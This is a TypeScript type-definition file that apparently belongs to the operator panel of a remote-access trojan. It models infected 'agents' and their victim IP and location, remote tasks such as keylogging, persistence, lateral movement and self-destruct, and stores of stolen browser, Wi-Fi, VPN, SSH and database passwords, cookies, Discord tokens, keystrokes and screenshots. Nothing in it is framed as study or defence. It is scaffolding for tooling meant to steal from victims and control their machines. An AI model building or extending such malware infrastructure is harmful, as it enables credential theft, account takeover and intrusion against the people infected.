export interface Agent {
  id: string
  session_id: number
  hostname: string
  username: string
  os_version: string
  arch: string
  pid: number
  privileges: number
  hw_id: string
  build_version: string
  external_ip: string
  internal_ip: string
  country_code: string
  city: string
  last_seen: string
  first_seen: string
  status: 'online' | 'offline' | 'stale' | 'dead'
  encryption_key: string
  hmac_key: string
  capabilities: string[]
}

export interface Task {
  id: string
  agent_id: string
  type: 'shell' | 'file_upload' | 'file_download' | 'screenshot' | 'keylog_start' | 'keylog_stop' | 'process_list' | 'module_load' | 'lateral_move' | 'persistence' | 'self_destruct' | 'update' | 'sleep' | 'custom'
  command: string
  args: Record<string, any>
  status: 'pending' | 'running' | 'completed' | 'failed' | 'cancelled'
  priority: number
  created_at: string
  started_at: string | null
  completed_at: string | null
  output: string | null
  error: string | null
  retries: number
  max_retries: number
}

export interface FileTransfer {
  id: string
  agent_id: string
  type: 'upload' | 'download'
  local_path: string
  remote_path: string
  size: number
  transferred: number
  chunks_total: number
  chunks_done: number
  sha256: string
  status: 'pending' | 'running' | 'completed' | 'failed' | 'paused'
  created_at: string
  started_at: string | null
  completed_at: string | null
  error: string | null
}

export interface Credential {
  id: string
  agent_id: string
  type: 'browser' | 'wifi' | 'vpn' | 'rdp' | 'ssh' | 'ftp' | 'database' | 'custom'
  source: string
  username: string
  password: string
  domain: string | null
  url: string | null
  extracted_at: string
}

export interface Cookie {
  id: string
  agent_id: string
  browser: string
  domain: string
  name: string
  value: string
  path: string
  expires: string | null
  secure: boolean
  http_only: boolean
  extracted_at: string
}

export interface DiscordToken {
  id: string
  agent_id: string
  token: string
  client_id: string | null
  email: string | null
  username: string | null
  avatar: string | null
  nitro_type: number | null
  extracted_at: string
}

export interface Keystroke {
  id: string
  agent_id: string
  window_title: string
  process_name: string
  keys: string
  timestamp: string
}

export interface Screenshot {
  id: string
  agent_id: string
  filename: string
  width: number
  height: number
  size: number
  format: string
  taken_at: string
  uploaded_at: string | null
}

export interface ProcessInfo {
  id: string
  agent_id: string
  pid: number
  ppid: number
  name: string
  path: string
  cmdline: string
  username: string
  cpu_percent: number
  memory_mb: number
  status: string
  started_at: string
  arch: string
}

export interface LateralMove {
  id: string
  agent_id: string
  technique: 'psexec' | 'wmiexec' | 'smbexec' | 'wmi' | 'rdp' | 'pth' | 'ssh' | 'custom'
  target: string
  target_hostname: string | null
  credentials_id: string | null
  status: 'pending' | 'running' | 'completed' | 'failed'
  output: string | null
  error: string | null
  created_at: string
  completed_at: string | null
}

export interface EvasionAction {
  id: string
  agent_id: string
  technique_id: string
  technique_name: string
  status: 'pending' | 'running' | 'completed' | 'failed'
  output: string | null
  error: string | null
  executed_at: string
  completed_at: string | null
}

export interface Module {
  id: string
  agent_id: string
  name: string
  version: string
  description: string
  loaded: boolean
  path: string | null
  exports: string[]
}

export interface ShellSession {
  id: string
  agent_id: string
  name: string
  shell_type: 'cmd' | 'powershell' | 'bash' | 'sh'
  history: { command: string; output: string; timestamp: string }[]
  active: boolean
  created_at: string
}

export interface Notification {
  id: string
  type: 'success' | 'error' | 'warning' | 'info'
  message: string
  read: boolean
  timestamp: string
}

export interface WSMessage {
  type: string
  payload: any
  agent_id?: string
  timestamp: string
}

export interface APIResponse<T> {
  success: boolean
  data?: T
  error?: string
  message?: string
}

export interface PaginatedResponse<T> {
  items: T[]
  total: number
  page: number
  page_size: number
  total_pages: number
}

export interface FilterState {
  search: string
  status: string
  category: string
  date_from: string | null
  date_to: string | null
}

export type Theme = 'dark' | 'light'

export interface SidebarItem {
  path: string
  label: string
  icon: React.ComponentType<{ className?: string }>
}